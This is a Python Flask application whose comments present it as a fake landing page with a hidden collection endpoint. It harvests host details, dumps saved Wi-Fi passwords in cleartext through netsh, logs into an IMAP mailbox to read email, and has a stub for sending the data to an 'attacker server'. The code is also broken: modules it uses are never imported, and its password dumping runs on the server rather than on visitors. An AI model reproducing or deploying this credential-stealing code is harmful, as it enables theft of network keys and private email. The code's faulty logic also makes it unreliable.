from flask import Flask, render_template, request, jsonify
import platform
import socket
import subprocess
import cv2
import base64
import threading
import time
import random
import string
import json
import os

app = Flask(__name__)

# Generate unique session ID
def generate_session_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Store collected data
collected_data = {}

# Fake landing page
@app.route('/')
def index():
    session_id = generate_session_id()
    collected_data[session_id] = {}
    return render_template('index.html', session_id=session_id)

# Real collection endpoint
@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    session_id = data.get('session_id')
    
    if not session_id or session_id not in collected_data:
        return jsonify({'error': 'Invalid session'}), 400
    
    # Collect device info
    collected_data[session_id]['device'] = {
        'platform': platform.system(),
        'hostname': socket.gethostname(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'timestamp': time.time()
    }
    
    # Collect location (simulated)
    collected_data[session_id]['location'] = {
        'lat': 40.7128,
        'lng': -74.0060
    }
    
    # Get passwords (Windows/Linux example)
    passwords = []
    if platform.system() == 'Windows':
        try:
            output = subprocess.check_output('netsh wlan show profiles').decode('utf-8')
            for line in output.split('\n'):
                if 'All User Profile' in line:
                    ssid = line.split(': ')[1].strip()
                    pwd = subprocess.check_output(f'netsh wlan show profile "{ssid}" key=clear').decode('utf-8')
                    passwords.append({'ssid': ssid, 'password': pwd.split('Key Content')[1].split(':')[1].strip()})
        except:
            pass
    collected_data[session_id]['passwords'] = passwords
    
    # Get emails (example)
    emails = []
    try:
        # Gmail example
        mail = imaplib.IMAP4_SSL('imap.gmail.com')
        mail.login('fake@example.com', 'fakepassword')
        mail.select('inbox')
        _, data = mail.search(None, 'ALL')
        for num in data[0].split():
            _, msg_data = mail.fetch(num, '(RFC822)')
            msg = email.message_from_bytes(msg_data[0][1])
            emails.append({
                'subject': msg['Subject'],
                'from': msg['From'],
                'date': msg['Date']
            })
        mail.close()
        mail.logout()
    except:
        pass
    collected_data[session_id]['emails'] = emails
    
    return jsonify({'status': 'success'})

# Send collected data to attacker server
def send_data(session_id):
    data = collected_data.get(session_id, {})
    if not data:
        return
        
    # Simulate sending to attacker server
    print(f"Sending data for session {session_id}: {data}")
    del collected_data[session_id]

# Periodic cleanup
def cleanup():
    while True:
        time.sleep(3600)  # Check every hour
        for sid in list(collected_data.keys()):
            if time.time() - collected_data[sid].get('timestamp', 0) > 86400:  # 24 hours
                del collected_data[sid]

# Start cleanup thread
threading.Thread(target=cleanup, daemon=True).start()

# Main entry point
if __name__ == '__main__':
    try:
        import pkg_resources
    except ImportError:
        # Fallback for missing pkg_resources
        pass
    
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
